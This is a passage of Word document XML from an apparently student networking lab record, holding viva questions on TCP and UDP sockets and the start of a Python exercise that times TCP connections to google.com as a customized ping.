          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="257B2697" wp14:editId="00843C09">
            <wp:extent cx="5731510" cy="2280920"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
            <wp:docPr id="83320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320981" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId29"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2280920"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="233EE87E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F69F980" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>concepts of socket programming in python were studied.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F95782B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="107C805C" w14:textId="77777777" w:rsidR="00D97D3B" w:rsidRDefault="00D97D3B" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="042FED34" w14:textId="0F998B2A" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Viva Questions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DABA6BA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is a socket in computer networks?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D28084E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A socket is an endpoint for sending and receiving data between two computers over a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D39745" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What are the two main types of sockets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675EDA27" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:The two main types are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE3EAD3" w14:textId="04CC6B63" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">TCP Socket (SOCK_STREAM): Connection-oriented and reliable. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB486A2" w14:textId="314068D1" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">UDP Socket (SOCK_DGRAM): Connectionless and faster but less reliable. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9DB07F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. What is the difference between TCP and UDP sockets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4288C217" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:TCP provides reliable, ordered, and error-checked communication, whereas UDP provides faster communication without guaranteeing delivery or order of packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="138AD0EA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Which Python module is commonly used for socket programming?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7D4B57" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:The socket module is used in Python for creating and managing network sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C03A80" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D90F793" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D768949" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What is the role of a server socket and a client socket?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377D88EA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A server socket listens for incoming connection requests, while a client socket initiates a connection to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FA5937" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="085C5FC6" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="503D7583" w14:textId="67281938" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Ex.No: 3       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D1F6F5" w14:textId="3DE5D667" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00F222CC">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>CUSTOMIZED PING COMMAND TO TEST THE SERVER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FC0312" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00F222CC">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>CONNECTIVITY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0EC338" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D643AF3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To develop a customized ping command to test the server connectivity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59363CA4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C13A8B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ping:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FEFAD9A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>The ping command sends ICMP echo request packets to a host and waits for echo replies. It measures reachability and reports RTT statistics (min, max, avg, packet loss).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E3D540" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2778A5BC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Set host, port, and number of pings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7ADA96" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Create an empty list to store RTT values.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36209CA9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Repeat for the given number of pings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C26D604" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Start a timer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18ED0A08" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Attempt to connect to host on the given port.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A69FAF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>6. Stop the timer if connection is successful.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B48E10E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>7. Calculate RTT and save it in the list.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05EE9FD2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>8. If connection fails, print timeout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E75E493" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>9. After all attempts, find minimum, maximum, and average RTT.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BCEB876" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>10. Display the results.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448777A2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB79383" w14:textId="77777777" w:rsidR="00772C5E" w:rsidRDefault="00772C5E" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C0569EE" w14:textId="4830A85B" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16BD8E67" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Customized ping command to test the server connectivity:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010CCF14" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6370D495" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A98394F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">host = "google.com"   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDB878E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">port = 80             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEC362A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">count = 4             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE6D276" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>for i in range(count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E24AD3E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4016FC17" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        s = socket.socket()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD1CCA8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        start = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A51BC1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        s.connect((host, port)) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042682F9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        end = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547B455A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        s.close()</w:t>
      </w:r>
    </w:p>
